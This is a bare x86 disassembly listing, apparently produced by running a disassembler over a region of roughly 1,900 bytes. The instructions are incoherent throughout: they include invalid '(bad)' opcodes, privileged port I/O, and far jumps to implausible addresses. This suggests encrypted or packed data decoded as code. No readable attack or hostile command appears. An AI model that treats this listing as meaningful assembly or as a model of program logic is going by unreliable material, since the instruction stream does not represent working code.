  421d14:	jmp    DWORD PTR [ebp-0x74]
  421d17:	mov    edx,0x5b0dd4a
  421d1c:	dec    edi
  421d1d:	ret    0xbaae
  421d20:	adc    BYTE PTR [edi+0x7f87d344],cl
  421d26:	lods   eax,DWORD PTR ds:[esi]
  421d27:	js     0x421d88
  421d29:	aam    0xca
  421d2b:	cs inc ecx
  421d2d:	xchg   ebp,eax
  421d2e:	sbb    eax,0x5bf4c524
  421d33:	dec    ebx
  421d34:	push   ecx
  421d35:	xor    BYTE PTR [ecx],0x48
  421d38:	or     edx,0x319801ed
  421d3e:	out    dx,eax
  421d3f:	repz mov ebx,0x34ebf01a
  421d45:	adc    DWORD PTR [eax-0x32818844],0xffffff8c
  421d4c:	stos   BYTE PTR es:[edi],al
  421d4d:	stc    
  421d4e:	pop    edx
  421d4f:	xchg   esi,eax
  421d50:	retf   0xb95b
  421d53:	mov    esp,0xf3f9078
  421d58:	dec    esp
  421d59:	dec    ebp
  421d5a:	xor    eax,0xb5b29347
  421d5f:	dec    eax
  421d60:	inc    esp
  421d61:	std    
  421d62:	ret    0xcdec
  421d65:	(bad)  
  421d66:	lds    esp,FWORD PTR [edx]
  421d68:	neg    DWORD PTR [edi+0x1]
  421d6b:	jp     0x421deb
  421d6d:	fbstp  TBYTE PTR [esi]
  421d6f:	cmp    al,0x47
  421d71:	pop    es
  421d72:	dec    ecx
  421d73:	cs sbb ebp,0x2d0d1454
  421d7a:	aad    0x12
  421d7c:	xlat   BYTE PTR ds:[ebx]
  421d7d:	xchg   esp,eax
  421d7e:	jns    0x421d08
  421d80:	icebp  
  421d81:	stos   BYTE PTR es:[edi],al
  421d82:	adc    BYTE PTR [eax-0x74dc4c6f],dh
  421d88:	adc    ebp,DWORD PTR [edi-0x81df2d4]
  421d8e:	mov    bh,0xa3
  421d90:	popf   
  421d91:	fsubr  QWORD PTR [esi]
  421d93:	push   ss
  421d94:	adc    al,0x87
  421d96:	push   ss
  421d97:	shl    DWORD PTR [eax+0x42],cl
  421d9a:	test   DWORD PTR [ecx-0x19],ebx
  421d9d:	pop    DWORD PTR [ebx-0x6a]
  421da0:	aam    0x92
  421da2:	rcl    BYTE PTR [edx],0x86
  421da5:	(bad)  
  421da7:	lds    esp,FWORD PTR [ecx+0x13]
  421daa:	lahf   
  421dab:	fiadd  DWORD PTR [ecx+0x25]
  421dae:	pop    es
  421daf:	ins    BYTE PTR es:[edi],dx
  421db0:	shl    ah,0x83
  421db3:	ret    0x8ccb
  421db6:	stc    
  421db7:	(bad)  
  421db8:	nop
  421db9:	ins    DWORD PTR es:[edi],dx
  421dba:	lods   al,BYTE PTR ds:[esi]
  421dbb:	aas    
  421dbc:	mov    bh,0x49
  421dbe:	hlt    
  421dbf:	ror    BYTE PTR [ebp-0x77],cl
  421dc2:	mov    bl,BYTE PTR [ebx+0x49]
  421dc5:	rcl    DWORD PTR [eax+esi*4+0x44],cl
  421dc9:	mov    bh,0xf5
  421dcb:	outs   dx,BYTE PTR ds:[esi]
  421dcc:	addr16 test al,0x34
  421dcf:	jbe    0x421e3a
  421dd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dd2:	mov    ecx,0x94be71dc
  421dd7:	jmp    0x783578d1
  421ddc:	lods   eax,DWORD PTR ds:[esi]
  421ddd:	sub    dh,BYTE PTR [edx-0x771b2eb7]
  421de3:	mov    ds:0xcdeb4211,eax
  421de8:	arpl   WORD PTR [ecx+0x7f14300d],ax
  421dee:	pop    ecx
  421def:	jae    0x421e0a
  421df1:	loopne 0x421d99
  421df3:	repnz stc 
  421df5:	inc    edi
  421df6:	pushf  
  421df7:	fs std 
  421df9:	scas   eax,DWORD PTR es:[edi]
  421dfa:	lock addr16 ss jle 0x421e5a
  421dff:	lods   al,BYTE PTR ds:[esi]
  421e00:	xor    cl,bl
  421e02:	and    al,0x0
  421e04:	inc    edx
  421e05:	js     0x421e16
  421e07:	mov    edx,DWORD PTR [edi+0x7b7a4df0]
  421e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e0e:	mov    cs,ebx
  421e10:	test   BYTE PTR [edi+0x1f4918aa],ch
  421e16:	mov    BYTE PTR [edi-0x77],bh
  421e19:	sub    DWORD PTR ds:0x37006e9b,eax
  421e1f:	fsubr  st(2),st
  421e21:	cmp    al,0x35
  421e23:	je     0x421e45
  421e25:	(bad)  
  421e26:	or     DWORD PTR [ebp-0x23],edi
  421e29:	pop    es
  421e2a:	sub    BYTE PTR [edi+0x69],dl
  421e2d:	sbb    bl,BYTE PTR [ebx+0x38]
  421e30:	jmp    0xd8b9dc5c
  421e35:	add    al,0xdf
  421e37:	cmc    
  421e38:	and    BYTE PTR [ebx-0x7fdbfd03],bh
  421e3e:	retf   0x4c28
  421e41:	jge    0x421e5c
  421e43:	(bad)  
  421e44:	mov    edi,0x52c4bc9a
  421e49:	div    edi
  421e4b:	ds stc 
  421e4d:	pop    edx
  421e4e:	mov    ds:0xc22193a5,eax
  421e53:	push   es
  421e54:	cmp    ecx,DWORD PTR [edi]
  421e56:	sbb    eax,0x8d5702e0
  421e5b:	lock arpl WORD PTR [edx+0x63],di
  421e5f:	xchg   esp,eax
  421e60:	xchg   DWORD PTR [ebx],edi
  421e62:	push   esp
  421e63:	sub    al,0x63
  421e65:	scas   al,BYTE PTR es:[edi]
  421e66:	and    ch,al
  421e68:	shr    BYTE PTR [edx],cl
  421e6a:	loop   0x421ecc
  421e6c:	jge    0x421eb0
  421e6e:	test   DWORD PTR [ebp-0x2d953e01],edx
  421e74:	jle    0x421e21
  421e76:	mov    ebx,0x8a357a42
  421e7b:	das    
  421e7c:	xchg   esp,eax
  421e7d:	push   esp
  421e7e:	mov    al,0xb1
  421e80:	and    dl,BYTE PTR [edx]
  421e82:	mov    cl,0x44
  421e84:	jge    0x421e76
  421e86:	jmp    0x421e69
  421e88:	inc    edx
  421e89:	dec    eax
  421e8a:	lods   eax,DWORD PTR ds:[esi]
  421e8b:	mov    ah,0x7e
  421e8d:	(bad)  
  421e8e:	cmp    esp,DWORD PTR [eax+ecx*8+0x673c1c18]
  421e95:	outs   dx,DWORD PTR ds:[esi]
  421e96:	jae    0x421e39
  421e98:	loope  0x421e83
  421e9a:	push   0x63
  421e9c:	dec    eax
  421e9d:	sub    BYTE PTR [esp+edx*8-0x4073428b],ah
  421ea4:	js     0x421e55
  421ea6:	int    0x58
  421ea8:	rcl    DWORD PTR [edx],0xb0
  421eab:	imul   ecx,DWORD PTR [ebx],0xfffffff8
  421eae:	fwait
  421eaf:	or     ecx,DWORD PTR [ecx-0x59d312ba]
  421eb5:	in     eax,dx
  421eb6:	loop   0x421ecb
  421eb8:	(bad)  
  421eb9:	(bad)  
  421ebb:	call   0xe3e0:0x809315c7
  421ec2:	into   
  421ec3:	repz xlat BYTE PTR ds:[ebx]
  421ec5:	scas   al,BYTE PTR es:[edi]
  421ec6:	xchg   BYTE PTR [esi+edx*8+0x1d],al
  421eca:	adc    BYTE PTR [ecx+0xc],0x76
  421ece:	or     ch,al
  421ed0:	or     dl,BYTE PTR [ebx-0x22]
  421ed3:	jns    0x421e67
  421ed5:	stc    
  421ed6:	sub    eax,0x6621cffb
  421edb:	push   ss
  421edc:	enter  0xd26f,0xfb
  421ee0:	push   0x5321a03e
  421ee5:	test   eax,0x5cb38b63
  421eea:	test   al,0x28
  421eec:	data16 add ch,cl
  421eef:	jle    0x421ec9
  421ef1:	sbb    ebx,DWORD PTR [eax+ebx*4-0x77]
  421ef5:	pusha  
  421ef6:	dec    ebp
  421ef7:	cdq    
  421ef8:	ss push eax
  421efa:	lods   eax,DWORD PTR ds:[esi]
  421efb:	or     DWORD PTR [edx-0x2df6b8ba],eax
  421f01:	mov    edx,0xda3f64dc
  421f06:	add    al,0xa
  421f08:	xchg   esp,eax
  421f09:	in     al,dx
  421f0a:	add    eax,DWORD PTR [ecx-0xf50c7fd]
  421f10:	test   DWORD PTR [ebp-0x13],ebp
  421f13:	mov    al,dh
  421f15:	in     al,0xe
  421f17:	mov    edx,0xcaa8f68c
  421f1c:	rsqrtps xmm0,xmm3
  421f1f:	scas   al,BYTE PTR es:[edi]
  421f20:	mov    ds:0xcf0a7c0,eax
  421f25:	fsubr  DWORD PTR [esi+eiz*2-0x1a]
  421f29:	sub    dh,BYTE PTR [esi+0x4bc88cd4]
  421f2f:	popa   
  421f30:	outs   dx,BYTE PTR ds:[esi]
  421f31:	pop    es
  421f32:	(bad)
  421f35:	outs   dx,DWORD PTR ds:[esi]
  421f36:	shr    BYTE PTR [esi],1
  421f38:	adc    BYTE PTR [edx],dh
  421f3a:	push   ecx
  421f3b:	cmp    BYTE PTR [edx],0x31
  421f3e:	call   0xfdfd78e6
  421f43:	inc    eax
  421f44:	mov    ebp,0xe0ea4e25
  421f49:	sub    al,0x1
  421f4b:	ffree  st(2)
  421f4d:	ret    
  421f4e:	pop    edx
  421f4f:	imul   esp,DWORD PTR [edi-0x24],0x14f4cefb
  421f56:	pop    edx
  421f57:	dec    eax
  421f58:	dec    esp
  421f59:	mov    ecx,0xd8664dc2
  421f5e:	ds inc ebx
  421f60:	cwde   
  421f61:	icebp  
  421f62:	div    dh
  421f64:	cmc    
  421f65:	jmp    0x67a3:0xb0cd15b5
  421f6c:	push   ebp
  421f6d:	nop
  421f6e:	or     al,0xf1
  421f70:	pop    esi
  421f71:	inc    ebp
  421f72:	mov    al,ah
  421f74:	mov    BYTE PTR [edi-0x7b021c7a],dl
  421f7a:	(bad)  
  421f7b:	jg     0x421f49
  421f7d:	add    ebp,ebp
  421f7f:	(bad)  
  421f80:	pop    esi
  421f81:	idiv   ch
  421f83:	xor    ecx,DWORD PTR [ecx]
  421f85:	aaa    
  421f86:	jmp    0xb817:0x6f8a2f9f
  421f8d:	mov    edi,0xe2f28d66
  421f92:	pop    es
  421f93:	test   eax,0x97f7e0fb
  421f98:	and    eax,0x8db8e8a6
  421f9d:	test   BYTE PTR [eax-0x22e2545],dh
  421fa3:	jmp    0xa3fe:0x8e16ed79
  421faa:	jmp    0x421fdc
  421fac:	bound  esi,QWORD PTR [ebx+0x7b4876a7]
  421fb2:	inc    ebp
  421fb3:	jg     0x421faa
  421fb5:	shld   eax,ebp,cl
  421fb8:	sbb    al,0xfe
  421fba:	aas    
  421fbb:	rcl    BYTE PTR [ebx-0x2ff60c1c],0xde
  421fc2:	std    
  421fc3:	xor    BYTE PTR [eax],ah
  421fc5:	inc    esi
  421fc6:	retf   0x67e7
  421fc9:	nop
  421fca:	call   0x3f24e099
  421fcf:	inc    edx
  421fd0:	sub    cl,BYTE PTR [ebx+edi*2]
  421fd3:	fnop   
  421fd5:	jns    0x421ff3
  421fd7:	mov    bl,0x9
  421fd9:	outs   dx,DWORD PTR ds:[esi]
  421fda:	sub    bh,dh
  421fdc:	push   edx
  421fdd:	sub    eax,0xea1b6217
  421fe2:	push   ds
  421fe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fe4:	sbb    DWORD PTR [ecx+0x31430261],0xffffffec
  421feb:	js     0x42203c
  421fed:	xor    eax,0x26bebec7
  421ff2:	fdiv   st,st(3)
  421ff4:	dec    ebx
  421ff5:	pop    esp
  421ff6:	jl     0x421fda
  421ff8:	mov    al,ds:0x2fdf1802
  421ffd:	jae    0x421fae
  421fff:	sbb    ah,bh
  422001:	das    
  422002:	jmp    FWORD PTR [esp+ebp*4+0x47]
  422006:	or     al,0xcc
  422008:	std    
  422009:	(bad)  
  42200a:	adc    al,0xc2
  42200c:	inc    eax
  42200d:	add    DWORD PTR [eax+0x5de3ede],edx
  422013:	repz add al,0x84
  422016:	aad    0x67
  422018:	int3   
  422019:	pop    ecx
  42201a:	jmp    0x42200f
  42201c:	icebp  
  42201d:	inc    edx
  42201e:	push   ss
  42201f:	add    al,dl
  422021:	xor    DWORD PTR [ebp+ebp*2-0x31e1d8d9],eax
  422028:	push   esi
  422029:	xchg   BYTE PTR [ebp-0xe],ah
  42202c:	div    esi
  42202e:	pop    esi
  42202f:	mov    cl,0xc7
  422031:	xchg   esp,eax
  422032:	inc    edi
  422033:	test   ecx,esp
  422035:	ins    DWORD PTR es:[edi],dx
  422036:	out    0x71,al
  422038:	dec    ebx
  422039:	add    bh,BYTE PTR ss:[esi+0x73]
  42203d:	leave  
  42203e:	cwde   
  42203f:	xchg   edx,eax
  422040:	ins    DWORD PTR es:[edi],dx
  422041:	xor    dh,ch
  422043:	mov    edx,DWORD PTR [ecx]
  422045:	sub    al,0x35
  422047:	jb     0x422079
  422049:	es in  al,dx
  42204b:	jge    0x421fea
  42204d:	inc    edi
  42204e:	pop    es
  42204f:	ins    BYTE PTR es:[edi],dx
  422050:	sub    al,BYTE PTR [eax+0x60ffbd68]
  422056:	bound  edx,QWORD PTR [edi]
  422058:	in     al,0xe2
  42205a:	jmp    0x7f49feb0
  42205f:	imul   esi,DWORD PTR [edx+0x34],0x43782706
  422066:	push   edi
  422067:	shr    dl,cl
  422069:	inc    edx
  42206a:	icebp  
  42206b:	push   0xbbc68f40
  422070:	cmp    cl,0xfe
  422073:	daa    
  422074:	push   0x80741ae3
  422079:	cmp    BYTE PTR [edx+esi*4-0x33],dl
  42207d:	js     0x422005
  42207f:	pushf  
  422080:	add    DWORD PTR [ebx-0x65],0xffffffa6
  422084:	or     BYTE PTR [esi-0x41733aa5],ah
  42208a:	adc    al,0x3b
  42208c:	(bad)  
  42208d:	mov    esp,0x245cabff
  422092:	mov    eax,0x15928df4
  422097:	out    dx,eax
  422098:	push   cs
  422099:	imul   ebp,DWORD PTR [ecx-0x53],0x5de8ce4f
  4220a0:	pop    ss
  4220a1:	dec    ebp
  4220a2:	jl     0x4220c9
  4220a4:	lods   eax,DWORD PTR ds:[esi]
  4220a5:	call   DWORD PTR [ecx]
  4220a7:	jmp    0xc493:0xebcc82e0
  4220ae:	scas   eax,DWORD PTR es:[edi]
  4220af:	in     al,dx
  4220b0:	or     al,0x14
  4220b2:	stc    
  4220b3:	pop    edx
  4220b4:	pop    ds
  4220b5:	cdq    
  4220b6:	and    edx,DWORD PTR [ebp+0x3a]
  4220b9:	ret    0xc0e8
  4220bc:	pop    esp
  4220bd:	out    0x7f,eax
  4220bf:	repnz cwde 
  4220c1:	mov    edi,0x11a8ae88
  4220c6:	or     DWORD PTR [ebp-0x33],ebx
  4220c9:	lds    esi,FWORD PTR [eax+0x37]
  4220cc:	cmp    BYTE PTR [esi],bl
  4220ce:	lahf   
  4220cf:	jnp    0x4220fb
  4220d1:	cmp    DWORD PTR [edi-0x62],esp
  4220d4:	(bad)  
  4220d5:	jp     0x4220bb
  4220d7:	bound  edi,QWORD PTR [ebx-0xb93780c]
  4220dd:	mov    eax,0xfbd2f393
  4220e2:	inc    eax
  4220e3:	loop   0x4220e0
  4220e5:	pusha  
  4220e6:	adc    DWORD PTR [ebx+0x74b32dfe],esp
  4220ec:	add    cl,BYTE PTR [ecx]
  4220ee:	pop    ds
  4220ef:	in     al,dx
  4220f0:	lods   eax,DWORD PTR ds:[esi]
  4220f1:	daa    
  4220f2:	(bad)  
  4220f4:	xchg   ebx,eax
  4220f5:	push   ebp
  4220f6:	sar    BYTE PTR [edx-0x5f],cl
  4220f9:	adc    ebp,ebx
  4220fb:	bound  esi,QWORD PTR [ebp+ecx*8+0x5e]
  4220ff:	mov    DWORD PTR [edi+0x839bf81],ebx
  422105:	enter  0x74ee,0x3c
  422109:	jne    0x4220ac
  42210b:	cmp    al,0xd3
  42210d:	sti    
  42210e:	and    ecx,DWORD PTR [ebp+0x29c6bdcc]
  422114:	es cmp dl,dh
  422117:	rcl    DWORD PTR [ebx+0x518251ee],0xf3
  42211e:	mov    bl,0xcd
  422120:	or     eax,0xe6d42aa9
  422125:	fimul  DWORD PTR [eax]
  422127:	ret    
  422128:	les    esp,FWORD PTR [ecx-0x62]
  42212b:	xor    DWORD PTR [eax+0xb],0x969c0c76
  422132:	aad    0xc5
  422134:	call   0x692d9f84
  422139:	push   ss
  42213a:	push   ecx
  42213b:	xchg   ebx,eax
  42213c:	outs   dx,DWORD PTR ds:[esi]
  42213d:	and    al,0xc7
  42213f:	fidivr DWORD PTR [edx+0x70]
  422142:	jecxz  0x422171
  422144:	ja     0x422189
  422146:	mov    al,ds:0x949ef1bf
  42214b:	pop    edi
  42214c:	fwait
  42214d:	loop   0x4220f0
  42214f:	jae    0x42213c
  422151:	icebp  
  422152:	repz jbe 0x4221d1
  422155:	nop
  422156:	outs   dx,BYTE PTR ds:[esi]
  422157:	pop    eax
  422158:	adc    edi,DWORD PTR [eax+0x4a]
  42215b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42215c:	mov    ebp,0xcae5a3c1
  422161:	outs   dx,DWORD PTR ds:[esi]
  422162:	inc    ebx
  422163:	pop    ds
  422164:	mov    cl,0xc
  422166:	mul    BYTE PTR [esi+eax*4-0x76]
  42216a:	adc    al,0xac
  42216c:	sbb    BYTE PTR [edi+eax*4],bl
  42216f:	mov    edi,0x23b8c1e8
  422174:	sbb    al,0x78
  422176:	jne    0x4221f4
  422178:	lea    edx,[ebx]
  42217a:	add    DWORD PTR es:[esi-0x22b9b279],eax
  422181:	xlat   BYTE PTR ds:[ebx]
  422182:	dec    esp
  422183:	cwde   
  422184:	fist   WORD PTR [edi+0x78]
  422187:	dec    esi
  422188:	mov    ecx,0x7a950777
  42218d:	push   eax
  42218e:	jmp    0x913d113a
  422193:	loop   0x422154
  422195:	mov    ah,0xab
  422197:	js     0x4221d6
  422199:	not    BYTE PTR [edi]
  42219b:	inc    edx
  42219c:	adc    cl,BYTE PTR [esi-0x7533003d]
  4221a2:	jge    0x42217f
  4221a4:	push   ebx
  4221a5:	int    0xf7
  4221a7:	jle    0x422219
  4221a9:	cmp    ebx,DWORD PTR [ecx+0x50d44fc]
  4221af:	ja     0x422184
  4221b1:	retf   0x2122
  4221b4:	ins    BYTE PTR es:[edi],dx
  4221b5:	or     edi,DWORD PTR [edi-0x67a0c27b]
  4221bb:	arpl   dx,sp
  4221bd:	ja     0x422224
  4221bf:	sar    DWORD PTR [edi+0x58],1
  4221c2:	outs   dx,DWORD PTR ds:[esi]
  4221c3:	pop    fs
  4221c5:	inc    ecx
  4221c6:	push   ss
  4221c7:	imul   eax,DWORD PTR [esi],0xffffffa0
  4221ca:	sar    BYTE PTR [esi],1
  4221cc:	jb     0x422150
  4221ce:	call   DWORD PTR ds:0x31874439
  4221d4:	xchg   edx,eax
  4221d5:	mov    WORD PTR [ecx+0x5e],ss
  4221d8:	xchg   edi,eax
  4221d9:	imul   DWORD PTR [edx-0x47]
  4221dc:	jo     0x42220e
  4221de:	and    ah,BYTE PTR [ebp-0x42]
  4221e1:	dec    ebp
  4221e2:	jp     0x4221a1
  4221e4:	pop    edi
  4221e5:	xor    eax,0x9899cd5c
  4221ea:	bnd jbe 0x4221d5
  4221ed:	mov    esp,0x7d124d30
  4221f2:	push   ss
  4221f3:	aas    
  4221f4:	lds    ecx,FWORD PTR [esi]
  4221f6:	int    0xb1
  4221f8:	inc    ebp
  4221f9:	pusha  
  4221fa:	xchg   ah,bh
  4221fc:	imul   ebp,DWORD PTR [ebx],0x4aee1082
  422202:	scas   ax,WORD PTR es:[edi]
  422204:	sbb    bh,0x1b
  422207:	or     al,0x4e
  422209:	in     eax,dx
  42220a:	jmp    FWORD PTR [edi-0x6f9000c0]
  422210:	aam    0x60
  422212:	mov    al,0x9d
  422214:	pop    esp
  422215:	jmp    0x422261
  422217:	jns    0x4221dc
  422219:	or     ecx,DWORD PTR [ebp-0x6b]
  42221c:	inc    esi
  42221d:	push   esp
  42221e:	(bad)  
  42221f:	(bad)  
  422220:	cmc    
  422221:	and    eax,0x72e051e4
  422226:	retf   
  422227:	mov    WORD PTR [esi-0x67],ds
  42222a:	dec    ebx
  42222b:	xchg   edi,eax
  42222c:	sub    BYTE PTR [esi-0x4e],ah
  42222f:	jecxz  0x4221ce
  422231:	fstp   DWORD PTR [ecx+0x43]
  422234:	mov    al,ds:0x8ca00ac0
  422239:	cld    
  42223a:	outs   dx,DWORD PTR ds:[esi]
  42223b:	and    ecx,ebx
  42223d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42223e:	push   ss
  42223f:	pusha  
  422240:	jg     0x42223a
  422242:	int3   
  422243:	pop    edi
  422244:	xchg   ecx,eax
  422245:	mov    al,BYTE PTR [ebp+0x73e1c13f]
  42224b:	clc    
  42224c:	jg     0x4222aa
  42224e:	xchg   esp,eax
  42224f:	xor    al,0x9f
  422251:	xchg   eax,ebx
  422253:	ja     0x42224a
  422255:	xor    esi,edi
  422257:	dec    edi
  422258:	in     al,dx
  422259:	call   DWORD PTR [edi-0x6a]
  42225c:	xor    ebp,DWORD PTR [ecx+edx*4-0x62d3100b]
  422263:	ror    BYTE PTR ds:0x5cd81a0d,0x3d
  42226a:	xchg   DWORD PTR [eax-0x50],ebx
  42226d:	fidivr DWORD PTR [esi]
  42226f:	pop    esp
  422270:	pop    ebp
  422271:	repz add ch,ah
  422274:	stc    
  422275:	test   DWORD PTR [ecx+esi*1-0x42],ebp
  422279:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42227a:	leave  
  42227b:	les    esp,FWORD PTR [eax+ebp*4]
  42227e:	(bad)  
  42227f:	cli    
  422280:	aad    0xee
  422282:	xchg   ch,ah
  422284:	(bad)  
  422285:	jmp    0xd2723808
  42228a:	fisttp WORD PTR [esi-0x27]
  42228d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42228e:	mov    edi,0x21f09c11
  422293:	ss jmp 0x71cd:0xae7ee2d7
  42229b:	and    al,0x6f
  42229d:	jns    0x422244
  42229f:	xchg   edx,eax
  4222a0:	cmp    esp,DWORD PTR [eax]
  4222a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222a3:	lock mov al,ds:0x2dc4903f
  4222a9:	in     eax,0xee
  4222ab:	cs adc eax,0x9ec8996
  4222b1:	and    DWORD PTR [ecx+eax*1+0x26],ebx
  4222b5:	(bad)  
  4222b6:	iret   
  4222b7:	neg    DWORD PTR [edi+ecx*1-0x53a6d968]
  4222be:	in     eax,dx
  4222bf:	sti    
  4222c0:	mov    ebx,0x1644ed29
  4222c5:	and    ebp,edx
  4222c7:	inc    ecx
  4222c8:	add    ah,BYTE PTR [eax*4-0x4331a536]
  4222cf:	inc    edi
  4222d0:	mov    cl,0x76
  4222d2:	and    al,0xcf
  4222d4:	retf   0x2680
  4222d7:	stos   DWORD PTR es:[edi],eax
  4222d8:	ins    BYTE PTR es:[edi],dx
  4222d9:	rcl    DWORD PTR [edi+0x53700a74],1
  4222df:	sahf   
  4222e0:	into   
  4222e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222e2:	adc    al,BYTE PTR [ebp-0x2e]
  4222e5:	imul   ebp,eax,0x7a34ba8d
  4222eb:	neg    ebx
  4222ed:	stos   BYTE PTR es:[edi],al
  4222ee:	dec    eax
  4222ef:	call   0x4c70:0x8e9428ab
  4222f6:	popf   
  4222f7:	cmp    edi,DWORD PTR [edi+0x72]
  4222fa:	jecxz  0x4222ee
  4222fc:	lods   eax,DWORD PTR ds:[esi]
  4222fd:	push   cs
  4222fe:	adc    esp,ebx
  422300:	dec    esp
  422301:	cmp    edx,edx
  422303:	inc    ecx
  422304:	(bad)  
  422305:	mov    ds:0x71aee169,eax
  42230a:	sbb    DWORD PTR [eax+eax*8-0x544ac33d],esi
  422311:	jns    0x422313
  422313:	clc    
  422314:	retf   
  422315:	or     dh,cl
  422317:	cmp    eax,esi
  422319:	add    al,0xa1
  42231b:	push   ecx
  42231c:	adc    dh,BYTE PTR [ebx-0x5b]
  42231f:	push   edi
  422320:	fs test ah,al
  422323:	xor    BYTE PTR [ebp-0x6e],al
  422326:	sub    ah,BYTE PTR [esi-0x7c68360b]
  42232c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42232d:	add    dh,ah
  42232f:	mov    edx,DWORD PTR [edx-0x59]
  422332:	mov    ebp,0x42a9997c
  422337:	push   edx
  422338:	pop    ds
  422339:	xor    eax,0x8b1570d0
  42233e:	mov    esp,0xf5156641
  422343:	sbb    cl,BYTE PTR [eax+0x52]
  422346:	inc    eax
  422347:	int3   
  422348:	dec    esi
  422349:	sbb    eax,0x1050b3bb
  42234e:	mov    WORD PTR ss:[eax+0x56],gs
  422352:	lea    ebp,[eax-0x67]
  422355:	outs   dx,DWORD PTR ds:[esi]
  422356:	inc    edi
  422357:	test   al,0xb0
  422359:	dec    eax
  42235a:	mov    al,ds:0xd6c78e61
  42235f:	js     0x4223cb
  422361:	jg     0x422341
  422363:	(bad)  [ecx]
  422365:	add    al,0x38
  422367:	lahf   
  422368:	int    0x6b
  42236a:	add    al,0xbc
  42236c:	dec    edi
  42236d:	jl     0x4222f5
  42236f:	pushf  
  422370:	sete   BYTE PTR [eax]
  422373:	pop    DWORD PTR [edx]
  422375:	mov    cl,0x61
  422377:	mov    ch,0xc7
  422379:	sub    bh,BYTE PTR ds:0x3ecd28a0
  42237f:	inc    BYTE PTR [eax+0x37]
  422382:	std    
  422383:	mov    ecx,0x216bd031
  422388:	mov    BYTE PTR [edx],ch
  42238a:	push   ecx
  42238b:	pop    edx
  42238c:	cli    
  42238d:	push   edi
  42238e:	mov    ch,0x11
  422390:	mov    cl,0xac
  422392:	stos   BYTE PTR es:[edi],al
  422393:	inc    ecx
  422394:	mov    bl,0xc0
  422396:	repz fcomp DWORD PTR [eax]
  422399:	into   
  42239a:	dec    eax
  42239b:	sbb    eax,0xa452b947
  4223a0:	sub    DWORD PTR [ecx+0xc557e56],0xffffffe0
  4223a7:	pushf  
  4223a8:	xchg   edx,eax
  4223a9:	bound  esi,QWORD PTR [ebp+edx*4-0x7d]
  4223ad:	test   eax,0xcf2c9a24
  4223b2:	mov    esp,DWORD PTR [ebx]
  4223b4:	cli    
  4223b5:	btc    DWORD PTR [ebx+0x48],ebx
  4223b9:	outs   dx,BYTE PTR ds:[esi]
  4223ba:	mov    al,ds:0x662fbeb
  4223bf:	icebp  
  4223c0:	jmp    0x42243d
  4223c2:	jg     0x4223e6
  4223c4:	inc    edx
  4223c5:	retf   
  4223c6:	cwde   
  4223c7:	hlt    
  4223c8:	ins    DWORD PTR es:[edi],dx
  4223c9:	mov    dh,BYTE PTR ds:0x1d651f0a
  4223cf:	sub    eax,0xa472674
  4223d4:	cdq    
  4223d5:	cmp    eax,0x3b703cc
  4223da:	jmp    0x422404
  4223dc:	push   esp
  4223dd:	pop    es
  4223de:	dec    esi
  4223df:	mov    ds:0xe2f71f1c,eax
  4223e4:	div    DWORD PTR [esi-0x3673ae37]
  4223ea:	dec    edi
  4223eb:	push   es
  4223ec:	lods   eax,DWORD PTR ds:[esi]
  4223ed:	shl    DWORD PTR [ecx],0x65
  4223f0:	and    BYTE PTR [edx-0x5f],0xca
  4223f4:	mov    ah,0x67
  4223f6:	jle    0x422398
  4223f8:	retf   
  4223f9:	xor    ch,BYTE PTR [ecx]
  4223fb:	push   ecx
  4223fc:	das    
  4223fd:	cmc    
  4223fe:	xchg   esi,eax
  4223ff:	repz lds esi,FWORD PTR [edx+ebx*2]
  422403:	loop   0x422446
  422405:	pushf  
  422406:	mov    ah,BYTE PTR [eax-0xa6c75f2]
  42240c:	sub    eax,0x1bd82e5
  422411:	dec    esp
  422412:	cmp    BYTE PTR [ebp+0x5],bl
  422415:	lods   eax,DWORD PTR ds:[esi]
  422416:	test   eax,0xcec9dc60
  42241b:	xchg   edi,eax
  42241c:	sbb    eax,DWORD PTR [esi-0x79]
  42241f:	cmp    esp,DWORD PTR [esi+eax*4+0x2]
  422423:	test   DWORD PTR [esi+0x6ea30f52],0xb20ebead
  42242d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242e:	lock aaa 
  422430:	retf   
  422431:	fisttp WORD PTR [esi-0x1b]
  422434:	cmp    eax,esp
  422436:	shl    DWORD PTR [eax+0x68d1ef18],0x75
  42243d:	xor    bl,dh
  42243f:	sub    eax,0x38eb1fef
  422444:	or     esp,ebp
  422446:	sbb    al,0x88
  422448:	pop    ds
  422449:	stos   BYTE PTR es:[edi],al
  42244a:	das    
  42244b:	lahf   
  42244c:	sub    edx,DWORD PTR [ecx+eiz*1]
  42244f:	mov    edx,DWORD PTR ds:0xead13a93
  422455:	retf   
  422456:	adc    DWORD PTR [ebp+ecx*1-0x72],esp
  42245a:	test   al,0x4c
  42245c:	(bad)  [ebx+0x3e]
  42245f:	mov    ebp,0x79e50fe4
  422464:	xor    dh,BYTE PTR [ebx-0x4]
  422467:	jmp    0xc5bb5e3c
  42246c:	adc    al,bl
  42246e:	xor    al,0x72
  422470:	cwde   
  422471:	adc    eax,0x919fa5d9
  422476:	jns    0x42245e
  422478:	and    DWORD PTR [ecx],0xffffffa9
  42247b:	out    0xbb,al
  42247d:	imul   eax,esi,0xffffffce
  422480:	call   0x1c407e55
  422485:	jne    0x422464
  422487:	in     eax,0x8
  422489:	mov    eax,eax
  42248b:	xor    BYTE PTR [ebx-0x52],0x6c
  42248f:	add    eax,0x2934ec67
  422494:	push   eax
  422495:	retf   0x6680
  422498:	dec    edi
  422499:	or     al,0xdd
  42249b:	mov    eax,ds:0x6c442361
  4224a0:	pop    eax
  4224a1:	div    BYTE PTR [edx]
  4224a3:	mov    dl,0x46
  4224a5:	aad    0xbd
  4224a7:	lds    ebp,FWORD PTR [eax]
  4224a9:	sub    al,0xef
  4224ab:	jmp    0xfab88ecf
  4224b0:	out    0x1a,eax
  4224b2:	push   ebp
  4224b3:	jnp    0x4224c0
  4224b5:	add    eax,0xcf0bd3b8
  4224ba:	inc    esi
